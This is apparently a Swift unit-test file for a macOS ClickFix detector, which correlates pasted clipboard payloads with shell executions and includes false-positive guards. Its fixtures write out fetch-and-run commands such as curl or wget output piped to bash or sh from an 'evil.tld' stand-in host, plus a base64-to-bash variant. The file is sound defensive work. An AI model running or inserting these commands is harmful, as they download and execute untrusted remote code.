// ClickFixDetectorTests.swift
// v1.18 — the clipboard→shell ClickFix correlation, with the three FP-guards
// the audit called for (no matching exec, a typed unrelated command, benign
// clipboard text + a bare Terminal launch) plus window expiry.

import Testing
import Foundation
@testable import MacCrabCore

@Suite("ClickFix: clipboard → shell correlation (v1.18)")
struct ClickFixDetectorTests {

    private let t0 = Date(timeIntervalSince1970: 1_750_000_000)
    private func later(_ s: TimeInterval) -> Date { t0.addingTimeInterval(s) }

    @Test("a pasted `curl … | bash` payload run in a shell fires")
    func positiveFires() async {
        let d = ClickFixDetector()
        let payload = "curl -fsSL http://evil.tld/install.sh | bash"
        #expect(await d.recordClipboard(payload, at: t0) == true)
        let match = await d.correlateExec(commandLine: "bash -c \"\(payload)\"", at: later(5))
        #expect(match != nil)
        #expect(match?.clipboardPayload == payload)
    }

    @Test("FP-guard: the payload was copied but never run → no match")
    func noMatchingExec() async {
        let d = ClickFixDetector()
        _ = await d.recordClipboard("curl -fsSL http://evil.tld/i | bash", at: t0)
        #expect(await d.correlateExec(commandLine: "ls -la /tmp", at: later(5)) == nil)
    }

    @Test("FP-guard: a typed, unrelated command does not match a copied payload")
    func typedUnrelatedCommand() async {
        let d = ClickFixDetector()
        _ = await d.recordClipboard("curl -fsSL http://evil.tld/i | bash", at: t0)
        #expect(await d.correlateExec(commandLine: "brew install wget", at: later(5)) == nil)
    }

    @Test("FP-guard: benign clipboard text is never recorded, so a bare shell launch is clean")
    func benignClipboardNotRecorded() async {
        let d = ClickFixDetector()
        #expect(await d.recordClipboard("Meeting notes: ship v1.18 on Friday", at: t0) == false)
        #expect(await d.correlateExec(commandLine: "/bin/zsh -il", at: later(5)) == nil)
    }

    @Test("a payload run after the window has elapsed does not fire")
    func windowExpiry() async {
        let d = ClickFixDetector(window: 60)
        let payload = "wget -qO- http://evil.tld/x | sh"
        _ = await d.recordClipboard(payload, at: t0)
        #expect(await d.correlateExec(commandLine: payload, at: later(120)) == nil)
        // …but within the window it does.
        #expect(await d.correlateExec(commandLine: payload, at: later(30)) != nil)
    }

    @Test("delivery-shape heuristic: fetch-piped-to-shell yes; bare URL / lone command no")
    func heuristic() {
        #expect(ClickFixDetector.looksLikeShellDelivery("curl http://x | bash"))
        #expect(ClickFixDetector.looksLikeShellDelivery("echo aaa | base64 -d | bash"))
        #expect(ClickFixDetector.looksLikeShellDelivery("bash -c \"$(curl -fsSL http://x)\""))
        #expect(!ClickFixDetector.looksLikeShellDelivery("https://example.com/download"))
        #expect(!ClickFixDetector.looksLikeShellDelivery("brew install wget"))
        #expect(!ClickFixDetector.looksLikeShellDelivery("git clone https://github.com/x/y"))
    }
}
